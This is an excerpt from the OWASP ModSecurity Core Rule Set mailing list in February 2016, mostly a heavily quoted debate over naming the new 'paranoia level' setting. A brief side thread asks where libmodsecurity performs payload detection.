> > attitude towards user submitted input.
> >
> > Ideally, two years down the line, ModSecurity (Core Rules)
> > discussion will run like this:
> > "Man, I should install ModSecurity and the Core Rules on my server,
> > but I heard false positives are going to kill me."
> > "No worries, as long as you keep the paranoia setting low, false
> > positives are minimal."
> >
> > Two weeks ago, the register ran a story about Rob Joyce, head of
> > NSA's Tailored Access Operations:
> > http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explai
> > ns_how_to_protect_your_network_from_his_minions/
> > The article closed with the register quoting Joyce:
> > "At the end of the day it all boils down to knowing your network, he
> > said, and it?s vital that IT administrators pick up their game and
> > get paranoid about attacks."
> >
> > Well said. And the core rules paranoia feature is going to help with
> > this in a controlled way without killing you with false positives on
> > the first day of the installation.
> >
> > But let's look at the alternatives: "Strict" has been named as a
> > better term. I do not like strict. It implies that the standard
> > installation is not strict. Or that the default rules were not
> > strict. In fact they are very strict. Every single one of them.
> > It's just that they are more focused on less delicate aspects of the
> > requests.
> >
> > So I think the term does not work as it misleads the user into
> > making the wrong assumptions. You could say that running the CRS in
> > anomaly scoring mode and setting a threshold of >5 is un-strict. But
> > the individual rules are all strict from my point of view.
> >
> > This is even more true, as we have Ryan Barnett's proposal to use
> > "aggressive". I think aggressive trumps strict as it sounds more
> > like a gradual setting in my ears (both terms exist in German as
> > well, so maybe these are false friends for me and their meaning is a
> > wee bit different in English).
> >
> > So this the new featureset would allow us to adjust how aggressive
> > the core rule set is. That does not sound too bad. It reminds me of
> > a "teeth metaphor" is use at times. A strong ruleset has strong
> > teeth. By tuning false positives, you pull a few of the teeth while
> > keeping most of them in place. The level of aggression adjusting
> > with this new setting, would thus add more teeth and the ruleset
> > would thus become more aggressive. I guess it's not overly wrong to think of piranhas in a pond.
> >
> > The root of the term comes with the idea of active defense.
> > It lets me thing of a strike back. Look up the term aggressive on
> > The Merriam Webster dictionary. All the definitions point in that
> > direction:
> > http://www.merriam-webster.com/dictionary/aggressive
> > Aggressive always means that you not only defend, but you attack as
> > well.
> >
> > (paranoia is entirely different in this regard. It does not imply
> > any counter strike)
> >
> > So I think aggressive does not entirely meet the character of the
> > new functionality, which is in line with the rest of the core rules
> > set in being entirely defensive. It just block attacks. It
> > absolutely does not attempt to shut down the client, inject malware
> > into the response or launch a DoS attack against the source IP
> > address (which would all be possible with the right set of rules).
> >
> > And what would be the complete term? Level of Aggression or Level of
> > Aggressiveness, Aggressiveness Setting? That all springs to mind.
> > And that just does not sounds very cool in my ears.
> > Or outrightly negative ("Level of Aggression!").
> >
> > So all in all, I think we should work with paranoia. It's the best I
> > can think of right now. And I thought about this a lot.
> >
> > But now let me hear what you think about it!
> >
> > Please do not take too long. My first pull request is almost ready,
> > so let's come to a resolution in the next few days.
> >
> > Best regards,
> >
> > Christian
> >
> >
> > --
> > Any technology that does not appear magical is insufficiently
> > advanced.
> > -- Gregory Benford
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule
> > -set
>
> --
> Walter Hop | PGP key: https://lifeforms.nl/pgp
>

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


--
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
________________________________
 This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.

From CSanders at trustwave.com  Sat Feb 20 15:40:04 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sat, 20 Feb 2016 15:40:04 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoid vs. Paranoia Mode
Message-ID: <D2EDF2B4.1A72E%csanders@trustwave.com>

Hey Lukas,
Going back through old emails - There was indeed a paranoid mode before.
This is infact why Ryan earlier this week cautioned against the use of the
term paranoid. It was seen as too much for normal users to use and so went
largely ignored, even though it was designed to be important to the
ruleset.

On 2/9/16, 10:35 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
behalf of Lukas.Funk at united-security-providers.ch> wrote:

>Hi,
>
>I was just having another look into the AuditConsole and stumbled over
>this screenshot:
>http://scanmail.trustwave.com/?c=4062&d=-I261hLggE-pYC4Oi0WIK8Xtbsw4TTmKzI
>1n9A63MQ&s=5&u=https%3a%2f%2fjwall%2eorg%2fweb%2faudit%2fconsole%2fscreens
>hots%2fevent-view2%2epng
>
>What caught my eye was in the Rules Section "setvar:tx.paranoid_mode=0"
>and it made me curious what that is.
>I could find anything in the latest CRS and also noting in older version
>in the GitHub repo...
>
>Googling I found this old message from the mailing list:
>http://scanmail.trustwave.com/?c=4062&d=-I261hLggE-pYC4Oi0WIK8Xtbsw4TTmKzI
>pg9V7oaQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fpipermail%2fowasp-modse
>curity-core-rule-set%2f2011-February%2f000621%2ehtml
>
>It shows a configuration with CRS 2.1.1 and there is a section -=[
>Paranoid Mode ]=-...
>Reading the description, it sound something similar Christian and others
>like to achieve right now.
>
>Has anybody an idea why it was removed? It might be helpful for further
>consideration implementing the new paranoia mode...
>
>Regards, Lukas


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From Lukas.Funk at united-security-providers.ch  Mon Feb 22 07:27:14 2016
From: Lukas.Funk at united-security-providers.ch (Funk, Lukas)
Date: Mon, 22 Feb 2016 07:27:14 +0000
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
	<20160220054556.GB25666@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>
Message-ID: <93BE8A5FB0778E48BF7BF2A9B09D7A580BADD97B@uspEXCH02.u-s-p.local>

Hi,

I think the term like "paranoia level" would fit its purpose. The arguments brought in from Christian are well put together and in my opinion we all got used to this name already a bit...

The only thing to keep an eye on is to clean up all the traces of the old paranoid mode!

Cheers, Lukas

> -----Urspr?ngliche Nachricht-----
> Von: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] Im
> Auftrag von Leos Rivas Manuel
> Gesendet: Samstag, 20. Februar 2016 10:37
> An: Christian Folini <christian.folini at netnea.com>; owasp-modsecurity-core-
> rule-set at lists.owasp.org
> Betreff: Re: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
> question
> 
> I like paranoia, who's not these days? Or do you trust developer's secure
> coding style???
> 
> -----Original Message-----
> From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On
> Behalf Of Christian Folini
> Sent: samedi 20 f?vrier 2016 06:46
> To: owasp-modsecurity-core-rule-set at lists.owasp.org
> Subject: Re: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
> question
> 
> Hello Walter,
> 
> Thank you for you heads up. You are probably right about the length of the
> message. I wanted to put as many arguments on the table as possible. But
> now I fear I have silenced the opposition.
> 
> Hopefully, Manuel and Chaim find time for a message sooner or later.
> 
> Ahoj,
> 
> Christian
> 
> On Fri, Feb 19, 2016 at 08:30:27PM +0100, Walter Hop wrote:
> > Hi Christian,
> >
> > You make some very good points! Meanwhile there seems to be a
> correlation between the length of a mailinglist post and the number of
> replies ;) I?m not too bothered with the name, I originally offered ?strict? but
> I can live perfectly with paranoia!
> >
> > Cheers,
> > WH
> >
> > > On 18 Feb 2016, at 13:13, Christian Folini <christian.folini at netnea.com>
> wrote:
> > >
> > > Hello,
> > >
> > > We have finished the list of rule candidates for our little pet
> > > project. I have a working implementation under
> > > https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-
> mode
> > > and I think it is time to sort out the naming question before
> > > submitting the first pull request with the basic mechanics.
> > > (-> see
> > >
> https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
> > > for an explanation of the 4 pull requests planned)
> > >
> > > I started out this project with the idea of an "on/off" setting.
> > > Hence the idea of "mode". However, it became clear we are going to
> > > work with a "level" ranging from 0-4 instead. So the idea of "mode"
> > > no longer really applies. We need to find something better.
> > >
> > > But of course, the core question is, if this should be called
> > > paranoia, paranoid, strict or agressive or something else.
> > >
> > > I opted for paranoia from the start and I still think it is the
> > > right term. However, there has been opposition and we need to find a
> > > solution everybody can agree with. I also think this is an important
> > > discussion, as it is a non-technical discussion. So everybody can
> > > chime in without being an expert and without running lengthy tests
> > > in his lab.
> > >
> > > Let me open the discussion with my reasoning why "paranoia" is the
> > > right term. I will then continue to discuss the other options and
> > > then you can respond and tell me why I am wrong and why the other
> > > options are much better suited....
> > >
> > > "Paranoia" is the new normal. The more the attacks evolve and the
> > > more servers we configure, the more we realise, there is no real
> > > security without being paranoid. So while paranoia used to be a
> > > negative term, it is getting a more and more positive connotation;
> > > especially in IT security.
> > > Google the terms
> > > paranoid information security
> > > and you will get 2M hits. One of the top ones is
> > > http://www.darkreading.com/operations/the-perfect-infosec-mindset-
> pa
> > > ranoia-+-skepticism/a/d-id/1297596
> > > where the author says paranoia is the standard mindset now (hence
> > > paranoia mode) and that you need to pair this with skepticism (in
> > > other words: the tuning of your ruleset).
> > >
> > > Other hits include the following titles:
> > > 13 Security and Privacy Tips for the Truly Paranoid Security for the
> > > Paranoid - SecurityFocus I became paranoid with computer security
> > > issues, I always ...
> > > The paranoid CISO | CSO Online
> > > Computer-Security Paranoia
> > > openssl - How paranoid should the average user be about ...
> > >
> > > Looking through some of these hits, I get the felling that those who
> > > really care about security acknowledge that they are paranoid and
> > > that they think that is the right attitude.
> > >
> > > I also remember reading about paranoid security settings 10-20 years
> > > ago and I would skip them immediately. Now, when looking at a new
> > > software or product, the term paranoia immediately catches my eye
> > > and I read about the most paranoid options first and then decide if
> > > the product is any good. Without paranoia options, I think it must
> > > be a happy sunshine hippy thing.
> > >
> > > Additionally, the term "PARANOID_MODE" is already there, even if it
> > > has not been in wide use in the 2.2.X series of rules:
> > >
> > > 2.2.X> grep -r -i paranoi | wc -l
> > > 9
> > >
> > > The Merriam-Wester dictionary has multiple definitions for paranoia.
> > > One of them is:
> > > "a tendency on the part of an individual or group toward excessive
> > > or irrational suspiciousness and distrustfulness of others"
> > >
> > > I think the adjectives "excessive", "irrational" "distrustful"
> > > characterise our new functionality very well: When raising the
> > > level, you are enabling additional rules, which will cause an
> > > excessive number of false positives due to a general distrustful
> > > attitude towards user submitted input.
> > >
> > > Ideally, two years down the line, ModSecurity (Core Rules)
> > > discussion will run like this:
> > > "Man, I should install ModSecurity and the Core Rules on my server,
> > > but I heard false positives are going to kill me."
> > > "No worries, as long as you keep the paranoia setting low, false
> > > positives are minimal."
> > >
> > > Two weeks ago, the register ran a story about Rob Joyce, head of
> > > NSA's Tailored Access Operations:
> > >
> http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explai
> > > ns_how_to_protect_your_network_from_his_minions/
> > > The article closed with the register quoting Joyce:
> > > "At the end of the day it all boils down to knowing your network, he
> > > said, and it?s vital that IT administrators pick up their game and
> > > get paranoid about attacks."
> > >
> > > Well said. And the core rules paranoia feature is going to help with
> > > this in a controlled way without killing you with false positives on
> > > the first day of the installation.
> > >
> > > But let's look at the alternatives: "Strict" has been named as a
> > > better term. I do not like strict. It implies that the standard
> > > installation is not strict. Or that the default rules were not
> > > strict. In fact they are very strict. Every single one of them.
> > > It's just that they are more focused on less delicate aspects of the
> > > requests.
> > >
> > > So I think the term does not work as it misleads the user into
> > > making the wrong assumptions. You could say that running the CRS in
> > > anomaly scoring mode and setting a threshold of >5 is un-strict. But
> > > the individual rules are all strict from my point of view.
> > >
> > > This is even more true, as we have Ryan Barnett's proposal to use
> > > "aggressive". I think aggressive trumps strict as it sounds more
> > > like a gradual setting in my ears (both terms exist in German as
> > > well, so maybe these are false friends for me and their meaning is a
> > > wee bit different in English).
> > >
> > > So this the new featureset would allow us to adjust how aggressive
> > > the core rule set is. That does not sound too bad. It reminds me of
> > > a "teeth metaphor" is use at times. A strong ruleset has strong
> > > teeth. By tuning false positives, you pull a few of the teeth while
> > > keeping most of them in place. The level of aggression adjusting
> > > with this new setting, would thus add more teeth and the ruleset
> > > would thus become more aggressive. I guess it's not overly wrong to
> think of piranhas in a pond.
> > >
> > > The root of the term comes with the idea of active defense.
> > > It lets me thing of a strike back. Look up the term aggressive on
> > > The Merriam Webster dictionary. All the definitions point in that
> > > direction:
> > > http://www.merriam-webster.com/dictionary/aggressive
> > > Aggressive always means that you not only defend, but you attack as
> > > well.
> > >
> > > (paranoia is entirely different in this regard. It does not imply
> > > any counter strike)
> > >
> > > So I think aggressive does not entirely meet the character of the
> > > new functionality, which is in line with the rest of the core rules
> > > set in being entirely defensive. It just block attacks. It
> > > absolutely does not attempt to shut down the client, inject malware
> > > into the response or launch a DoS attack against the source IP
> > > address (which would all be possible with the right set of rules).
> > >
> > > And what would be the complete term? Level of Aggression or Level of
> > > Aggressiveness, Aggressiveness Setting? That all springs to mind.
> > > And that just does not sounds very cool in my ears.
> > > Or outrightly negative ("Level of Aggression!").
> > >
> > > So all in all, I think we should work with paranoia. It's the best I
> > > can think of right now. And I thought about this a lot.
> > >
> > > But now let me hear what you think about it!
> > >
> > > Please do not take too long. My first pull request is almost ready,
> > > so let's come to a resolution in the next few days.
> > >
> > > Best regards,
> > >
> > > Christian
> > >
> > >
> > > --
> > > Any technology that does not appear magical is insufficiently
> > > advanced.
> > > -- Gregory Benford
> > > _______________________________________________
> > > Owasp-modsecurity-core-rule-set mailing list
> > > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule
> > > -set
> >
> > --
> > Walter Hop | PGP key: https://lifeforms.nl/pgp
> >
> 
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-s
> > et
> 
> 
> --
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-
> set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> ________________________________
>  This message and any attachments are intended solely for the addressees
> and may contain confidential information. Any unauthorized use or
> disclosure, either whole or partial, is prohibited.
> E-mails are susceptible to alteration. Our company shall not be liable for the
> message if altered, changed or falsified. If you are not the intended recipient
> of this message, please delete it and notify the sender.
> Although all reasonable efforts have been made to keep this transmission
> free from viruses, the sender will not be liable for damages caused by a
> transmitted virus.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-
> set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
-------------- next part --------------
A non-text attachment was scrubbed...
Name: smime.p7s
Type: application/x-pkcs7-signature
Size: 5505 bytes
Desc: not available
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160222/8606e81c/attachment.bin>

From d0lph1n98 at yahoo.com  Mon Feb 22 09:36:43 2016
From: d0lph1n98 at yahoo.com (Big Whale)
Date: Mon, 22 Feb 2016 09:36:43 +0000 (UTC)
Subject: [Owasp-modsecurity-core-rule-set] LibModsecurity
References: <1334648875.746105.1456133803721.JavaMail.yahoo.ref@mail.yahoo.com>
Message-ID: <1334648875.746105.1456133803721.JavaMail.yahoo@mail.yahoo.com>

Hello,

i'm having a hard time in finding the function call that actually detect injection payload (e.g <script>alert(1)</script>). The payload does not necessarily need to
exactly like the one i provided in the brackets. 

Based on the code flow (https://github.com/SpiderLabs/ModSecurity/blob/libmodsecurity/examples/simple_example_using_c/test.c), the code basically just initiate the rules to the modsecurity instance and also try to initiate remote rules and i don't find any function call that actually does the payload detection, is it already implemented? maybe i missed somewhere. Thanks.

From christian.folini at netnea.com  Mon Feb 22 10:11:33 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 11:11:33 +0100
Subject: [Owasp-modsecurity-core-rule-set] LibModsecurity
In-Reply-To: <1334648875.746105.1456133803721.JavaMail.yahoo@mail.yahoo.com>
References: <1334648875.746105.1456133803721.JavaMail.yahoo.ref@mail.yahoo.com>
	<1334648875.746105.1456133803721.JavaMail.yahoo@mail.yahoo.com>
Message-ID: <20160222101133.GB14843@elias>

Hi there,

You may want to ask this on the mosecurity-development mailinglist.

In this mailinglist, we are talking about the OWASP ModSecurity Core
Rules.

Good luck!

Christian Folini

On Mon, Feb 22, 2016 at 09:36:43AM +0000, Big Whale wrote:
> Hello,
> 
> i'm having a hard time in finding the function call that actually detect injection payload (e.g <script>alert(1)</script>). The payload does not necessarily need to
> exactly like the one i provided in the brackets. 
> 
> Based on the code flow (https://github.com/SpiderLabs/ModSecurity/blob/libmodsecurity/examples/simple_example_using_c/test.c), the code basically just initiate the rules to the modsecurity instance and also try to initiate remote rules and i don't find any function call that actually does the payload detection, is it already implemented? maybe i missed somewhere. Thanks.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From CSanders at trustwave.com  Mon Feb 22 13:02:35 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 13:02:35 +0000
Subject: [Owasp-modsecurity-core-rule-set] LibModsecurity
In-Reply-To: <1334648875.746105.1456133803721.JavaMail.yahoo@mail.yahoo.com>
References: <1334648875.746105.1456133803721.JavaMail.yahoo.ref@mail.yahoo.com>
	<1334648875.746105.1456133803721.JavaMail.yahoo@mail.yahoo.com>
Message-ID: <D2F07108.1A802%csanders@trustwave.com>

Although I haven?t updated it for the latest API yet, you might be looking
for something like the following:
https://github.com/SpiderLabs/ModSecurity-pcap/blob/master/pcap.cc


On 2/22/16, 4:36 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of Big
Whale" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf
of d0lph1n98 at yahoo.com> wrote:

>Hello,
>
>i'm having a hard time in finding the function call that actually detect
>injection payload (e.g <script>alert(1)</script>). The payload does not
>necessarily need to
>exactly like the one i provided in the brackets.
>
>Based on the code flow
>(http://scanmail.trustwave.com/?c=4062&d=9tzK1h38IqAhEgQ38nNnYSnl3JmZpn1Qw
>kUELBOfhg&s=5&u=https%3a%2f%2fgithub%2ecom%2fSpiderLabs%2fModSecurity%2fbl
>ob%2flibmodsecurity%2fexamples%2fsimple%5fexample%5fusing%5fc%2ftest%2ec%2
>9 the code basically just initiate the rules to the modsecurity instance
>and also try to initiate remote rules and i don't find any function call
>that actually does the payload detection, is it already implemented?
>maybe i missed somewhere. Thanks.
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=9tzK1h38IqAhEgQ38nNnYSnl3JmZpn1Qwh
>IBIxTLjw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 13:06:20 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 13:06:20 +0000
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <93BE8A5FB0778E48BF7BF2A9B09D7A580BADD97B@uspEXCH02.u-s-p.local>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
	<20160220054556.GB25666@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BADD97B@uspEXCH02.u-s-p.local>
Message-ID: <D2F07196.1A805%csanders@trustwave.com>

Hey Guys,
I think I?ve chimed in on this topic once or twice. I?m with Ryan in that
the use of the term paranoid makes it sound too advanced as people are
already put off by the complexity of ModSecurity. Although you bring up
many good points in your email, I still think that based off of my
experiences it makes more sense to call it aggressiveness, especially now
that we have multiple levels. Great email btw Christian.

On 2/22/16, 2:27 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
behalf of Lukas.Funk at united-security-providers.ch> wrote:

>Hi,
>
>I think the term like "paranoia level" would fit its purpose. The
>arguments brought in from Christian are well put together and in my
>opinion we all got used to this name already a bit...
>
>The only thing to keep an eye on is to clean up all the traces of the old
>paranoid mode!
>
>Cheers, Lukas
>
>> -----Urspr?ngliche Nachricht-----
>> Von: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] Im
>> Auftrag von Leos Rivas Manuel
>> Gesendet: Samstag, 20. Februar 2016 10:37
>> An: Christian Folini <christian.folini at netnea.com>;
>>owasp-modsecurity-core-
>> rule-set at lists.owasp.org
>> Betreff: Re: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
>> question
>>
>> I like paranoia, who's not these days? Or do you trust developer's
>>secure
>> coding style???
>>
>> -----Original Message-----
>> From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On
>> Behalf Of Christian Folini
>> Sent: samedi 20 f?vrier 2016 06:46
>> To: owasp-modsecurity-core-rule-set at lists.owasp.org
>> Subject: Re: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
>> question
>>
>> Hello Walter,
>>
>> Thank you for you heads up. You are probably right about the length of
>>the
>> message. I wanted to put as many arguments on the table as possible. But
>> now I fear I have silenced the opposition.
>>
>> Hopefully, Manuel and Chaim find time for a message sooner or later.
>>
>> Ahoj,
>>
>> Christian
>>
>> On Fri, Feb 19, 2016 at 08:30:27PM +0100, Walter Hop wrote:
>> > Hi Christian,
>> >
>> > You make some very good points! Meanwhile there seems to be a
>> correlation between the length of a mailinglist post and the number of
>> replies ;) I?m not too bothered with the name, I originally offered
>>?strict? but
>> I can live perfectly with paranoia!
>> >
>> > Cheers,
>> > WH
>> >
>> > > On 18 Feb 2016, at 13:13, Christian Folini
>><christian.folini at netnea.com>
>> wrote:
>> > >
>> > > Hello,
>> > >
>> > > We have finished the list of rule candidates for our little pet
>> > > project. I have a working implementation under
>> > >
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>Ao2EcJADQ&s=5&u=https%3a%2f%2fgithub%2ecom%2fdune73%2fowasp-modsecurity-c
>>rs%2ftree%2fparanoia-
>> mode
>> > > and I think it is time to sort out the naming question before
>> > > submitting the first pull request with the basic mechanics.
>> > > (-> see
>> > >
>>
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>FwxQ8VCDA&s=5&u=https%3a%2f%2fwww%2eowasp%2eorg%2findex%2ephp%2fOWASP%5fM
>>odSec%5fCRS%5fParanoia%5fMode
>> > > for an explanation of the 4 pull requests planned)
>> > >
>> > > I started out this project with the idea of an "on/off" setting.
>> > > Hence the idea of "mode". However, it became clear we are going to
>> > > work with a "level" ranging from 0-4 instead. So the idea of "mode"
>> > > no longer really applies. We need to find something better.
>> > >
>> > > But of course, the core question is, if this should be called
>> > > paranoia, paranoid, strict or agressive or something else.
>> > >
>> > > I opted for paranoia from the start and I still think it is the
>> > > right term. However, there has been opposition and we need to find a
>> > > solution everybody can agree with. I also think this is an important
>> > > discussion, as it is a non-technical discussion. So everybody can
>> > > chime in without being an expert and without running lengthy tests
>> > > in his lab.
>> > >
>> > > Let me open the discussion with my reasoning why "paranoia" is the
>> > > right term. I will then continue to discuss the other options and
>> > > then you can respond and tell me why I am wrong and why the other
>> > > options are much better suited....
>> > >
>> > > "Paranoia" is the new normal. The more the attacks evolve and the
>> > > more servers we configure, the more we realise, there is no real
>> > > security without being paranoid. So while paranoia used to be a
>> > > negative term, it is getting a more and more positive connotation;
>> > > especially in IT security.
>> > > Google the terms
>> > > paranoid information security
>> > > and you will get 2M hits. One of the top ones is
>> > >
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>Ak0FMVHBg&s=5&u=http%3a%2f%2fwww%2edarkreading%2ecom%2foperations%2fthe-p
>>erfect-infosec-mindset-
>> pa
>> > > ranoia-+-skepticism/a/d-id/1297596
>> > > where the author says paranoia is the standard mindset now (hence
>> > > paranoia mode) and that you need to pair this with skepticism (in
>> > > other words: the tuning of your ruleset).
>> > >
>> > > Other hits include the following titles:
>> > > 13 Security and Privacy Tips for the Truly Paranoid Security for the
>> > > Paranoid - SecurityFocus I became paranoid with computer security
>> > > issues, I always ...
>> > > The paranoid CISO | CSO Online
>> > > Computer-Security Paranoia
>> > > openssl - How paranoid should the average user be about ...
>> > >
>> > > Looking through some of these hits, I get the felling that those who
>> > > really care about security acknowledge that they are paranoid and
>> > > that they think that is the right attitude.
>> > >
>> > > I also remember reading about paranoid security settings 10-20 years
>> > > ago and I would skip them immediately. Now, when looking at a new
>> > > software or product, the term paranoia immediately catches my eye
>> > > and I read about the most paranoid options first and then decide if
>> > > the product is any good. Without paranoia options, I think it must
>> > > be a happy sunshine hippy thing.
>> > >
>> > > Additionally, the term "PARANOID_MODE" is already there, even if it
>> > > has not been in wide use in the 2.2.X series of rules:
>> > >
>> > > 2.2.X> grep -r -i paranoi | wc -l
>> > > 9
>> > >
>> > > The Merriam-Wester dictionary has multiple definitions for paranoia.
>> > > One of them is:
>> > > "a tendency on the part of an individual or group toward excessive
>> > > or irrational suspiciousness and distrustfulness of others"
>> > >
>> > > I think the adjectives "excessive", "irrational" "distrustful"
>> > > characterise our new functionality very well: When raising the
>> > > level, you are enabling additional rules, which will cause an
>> > > excessive number of false positives due to a general distrustful
>> > > attitude towards user submitted input.
>> > >
>> > > Ideally, two years down the line, ModSecurity (Core Rules)
>> > > discussion will run like this:
>> > > "Man, I should install ModSecurity and the Core Rules on my server,
>> > > but I heard false positives are going to kill me."
>> > > "No worries, as long as you keep the paranoia setting low, false
>> > > positives are minimal."
>> > >
>> > > Two weeks ago, the register ran a story about Rob Joyce, head of
>> > > NSA's Tailored Access Operations:
>> > >
>>
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>F1iRJASCQ&s=5&u=http%3a%2f%2fwww%2etheregister%2eco%2euk%2f2016%2f01%2f28
>>%2fnsas%5ftop%5fhacking%5fboss%5fexplai
>> > > ns_how_to_protect_your_network_from_his_minions/
>> > > The article closed with the register quoting Joyce:
>> > > "At the end of the day it all boils down to knowing your network, he
>> > > said, and it?s vital that IT administrators pick up their game and
>> > > get paranoid about attacks."
>> > >
>> > > Well said. And the core rules paranoia feature is going to help with
>> > > this in a controlled way without killing you with false positives on
>> > > the first day of the installation.
>> > >
>> > > But let's look at the alternatives: "Strict" has been named as a
>> > > better term. I do not like strict. It implies that the standard
>> > > installation is not strict. Or that the default rules were not
>> > > strict. In fact they are very strict. Every single one of them.
>> > > It's just that they are more focused on less delicate aspects of the
>> > > requests.
>> > >
>> > > So I think the term does not work as it misleads the user into
>> > > making the wrong assumptions. You could say that running the CRS in
>> > > anomaly scoring mode and setting a threshold of >5 is un-strict. But
>> > > the individual rules are all strict from my point of view.
>> > >
>> > > This is even more true, as we have Ryan Barnett's proposal to use
>> > > "aggressive". I think aggressive trumps strict as it sounds more
>> > > like a gradual setting in my ears (both terms exist in German as
>> > > well, so maybe these are false friends for me and their meaning is a
>> > > wee bit different in English).
>> > >
>> > > So this the new featureset would allow us to adjust how aggressive
>> > > the core rule set is. That does not sound too bad. It reminds me of
>> > > a "teeth metaphor" is use at times. A strong ruleset has strong
>> > > teeth. By tuning false positives, you pull a few of the teeth while
>> > > keeping most of them in place. The level of aggression adjusting
>> > > with this new setting, would thus add more teeth and the ruleset
>> > > would thus become more aggressive. I guess it's not overly wrong to
>> think of piranhas in a pond.
>> > >
>> > > The root of the term comes with the idea of active defense.
